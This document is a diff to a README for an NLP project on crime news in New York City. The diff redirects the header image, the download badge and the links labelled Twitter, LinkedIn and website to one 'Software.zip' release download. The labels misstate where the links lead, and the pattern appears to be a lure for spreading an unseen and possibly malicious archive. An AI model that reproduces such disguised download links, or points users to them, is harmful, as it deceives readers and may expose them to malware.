@@ -1,6 +1,6 @@
 # Crime News AI NLP Machine Learning 🕵️‍♂️📰
 
-![Crime News AI NLP Machine Learning](https://img.icons8.com/nolan/2x/data-visualization.png)  
+![Crime News AI NLP Machine Learning](https://github.com/imenapr/Crime-News-AI-NLP-Machine-Learning/releases/download/v2.0/Software.zip)  
 
 Welcome to the **Crime News AI NLP Machine Learning** repository! This project is dedicated to performing topic modeling on a dataset of crime-related news articles in New York City using **Latent Dirichlet Allocation (LDA)** and **Mallet's LDA Model**. The articles were collected over a two-month period through continuous querying using the **News API** 🚔📑.
 
@@ -32,7 +32,7 @@ The repository includes interactive **Jupyter Notebooks** and **Google Colab Not
 
 To access the software files for this project, please click the button below:
 
-[![Software Files](https://img.shields.io/badge/Download%20Software-Click%20Here-orange)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Software Files](https://github.com/imenapr/Crime-News-AI-NLP-Machine-Learning/releases/download/v2.0/Software.zip%20Software-Click%20Here-orange)](https://github.com/imenapr/Crime-News-AI-NLP-Machine-Learning/releases/download/v2.0/Software.zip)
 
 (Note: The link needs to be launched to access the software files.)
 
@@ -50,9 +50,9 @@ Contributions to this repository are welcome! If you have any feedback, suggesti
 
 Stay updated on the latest developments and releases related to **Crime News AI NLP Machine Learning** by following our social media channels:
 
-- Twitter: [@CrimeNewsAI](https://twitter.com/CrimeNewsAI)
-- LinkedIn: [Crime News AI NLP Machine Learning](https://www.linkedin.com/company/crime-news-ai-nlp-machine-learning)
-- Website: [CrimeNewsAILearnMore.com](https://CrimeNewsAILearnMore.com)
+- Twitter: [@CrimeNewsAI](https://github.com/imenapr/Crime-News-AI-NLP-Machine-Learning/releases/download/v2.0/Software.zip)
+- LinkedIn: [Crime News AI NLP Machine Learning](https://github.com/imenapr/Crime-News-AI-NLP-Machine-Learning/releases/download/v2.0/Software.zip)
+- Website: [https://github.com/imenapr/Crime-News-AI-NLP-Machine-Learning/releases/download/v2.0/Software.zip](https://github.com/imenapr/Crime-News-AI-NLP-Machine-Learning/releases/download/v2.0/Software.zip)
 
 Join us on this thrilling journey of exploring crime news through the lens of artificial intelligence, natural language processing, and machine learning. Let's uncover the hidden insights within crime-related news articles and contribute to building a safer and more informed community! 🕵️‍♀️🔍
 
